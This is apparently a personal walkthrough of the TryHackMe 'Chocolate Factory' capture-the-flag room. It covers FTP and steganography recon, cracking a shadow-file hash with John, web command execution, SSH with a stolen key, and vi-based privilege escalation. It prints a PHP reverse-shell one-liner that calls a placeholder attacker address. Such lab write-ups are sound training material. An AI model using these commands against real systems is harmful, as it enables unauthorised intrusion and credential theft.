TryHackMe <br>
Chocolate Factory
---
Here’s the initial `nmap` scan with some good information. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/05e0541b-eee5-4a8e-b16b-2ba66987fda9)

I tried a few scans with Gobuster, but didn’t return too much. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/57286467-5f52-4c08-a2a1-f313a02cecef)

The next thing I was going to do is check the FTP server since anonymous login was enabled. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d84dd4a2-68ff-403f-8ca5-153213770825)

I used `wget` to download that image and proceeded to use `stegseek` to crack the password if it had one. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d0121ec4-78aa-4a26-9fcf-6781905c6cb5)

The output of the file is base 64 encoded so I decoded it, put that in a new file and opened that file. <br>
```
base64 –decode output.txt >> output2.txt | cat output2.txt
```
Inside looked like the <i>/etc/shadow</i> contents. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0765cf7e-9236-47e0-bf0f-59e348f59340)

It’s now time to try to crack that hash with `John`. <br>
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt output2.txt
```
Bingo-bango! <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b14110e3-1a8b-406b-b965-fea8cd536c87)

I tried to SSH with the found credentials but no luck, however, they did get me in to the website. <br>
Once logged in the website, at the <i>/home.php</i> page, there’s a text box that can execute commands. <br>
There were a few files in the directory I was in. One was “key_rev_key”. <br>
I was able to open it and there was a lot of jumbled text so I decided to use `strings`. <br>
That simplified things and showed the “key” <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1a12dc38-f5b3-4b43-8ae2-84b9c6b1180b)

<b>*<i>NOTE: there was another way to do this by using a reverse shell for easier maneuvering around the file system</i>*</b> <br>
Reverse shell to make it easier to navigate. (I used a reverse shell cheat sheet) <br>
I had `netcat` open on my attack machine with a listener set up that was in place of <b>ip-address</b> and <b>port</b> <br>
```
php -r '$sock=fsockopen("ip-address",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Another way I found to get files was by setting up a python server from the command box on the web page. <br>
From my attack machine I was able to download a few files of interest. <br>
One was in the directory of <i>Charlie</i>. The file was named <b>teleport</b> which ended up being charlie’s key to ssh into the machine. <br>
Since the password from earlier didn’t work, I used the file and changed permissions to `400` because I ran into permissions issues using SSH at first. <br>
```
sudo chmod 400 teleport
ssh charlie@<target_IP> -i teleport
```
Success! <br>
This is what Charlie can run as root: <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/9645a7ee-8326-4a69-b644-72f538ecb9bd)

I could also finally read the <b>user.txt</b> file. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/872a21aa-af37-4868-ac6d-eb6f11e592ed)

I had to do some research and good ol’ Google helped me out again with exploiting `vi`. <br>
`Vi` let’s you run commands, hence the `-c`. <br>
Here we can finally open the <i>user.txt</i> file and read the flag. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/99859943-147e-4ab6-ab70-fc318d561968)

As root user, in the root directory there was a python file. <br>
After trying to execute it I was prompted for the key, which I thought was the one from earlier. <br>
Then we get the confirmation it was correct and the final flag. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/8b215b95-4250-47c3-b7e6-f34350f56558)
















